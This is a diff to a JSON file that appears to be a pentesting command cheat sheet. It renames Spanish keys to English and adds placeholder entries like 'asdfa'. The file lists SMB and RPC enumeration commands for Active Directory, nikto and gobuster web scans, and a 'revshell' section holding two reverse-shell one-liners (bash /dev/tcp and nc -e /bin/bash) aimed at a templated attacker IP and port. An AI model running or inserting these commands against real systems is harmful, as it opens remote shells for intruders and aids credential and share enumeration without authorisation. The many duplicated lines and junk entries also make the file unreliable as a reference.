@@ -1,15 +1,6 @@
 {
   "Active Directory": {
-    "enumeracion": [
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
-      "smbclient -L //{{IP}} -U {{USUARIO}}",
+    "enumeration": [
       "smbclient -L //{{IP}} -U {{USUARIO}}",
       "smbclient -L //{{IP}} -U {{USUARIO}}",
       "smbclient -L //{{IP}} -U {{USUARIO}}",
@@ -29,16 +20,22 @@
       "smbclient -L //{{IP}} -U {{USUARIO}}",
       "smbclient -L //{{IP}} -U {{USUARIO}}",
       "rpcclient -U {{USUARIO}} -P '{{CONTRASEÑA}}' -N {{IP}}"
+    ],
+    "exploitation":[
+      "certify"
+    ],
+    "Ejemplo":[
+      "asdfa"
     ]
   },
   "web": {
-    "enumeracion": [
+    "enumeration": [
       "nikto -h http://{{IP}}",
       "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirb/common.txt"
     ]
   },
   "revshell": {
-    "reverse": [
+    "shell": [
       "bash -i >& /dev/tcp/{{IP}}/{{PUERTO}} 0>&1",
       "nc -e /bin/bash {{IP}} {{PUERTO}}"
     ]
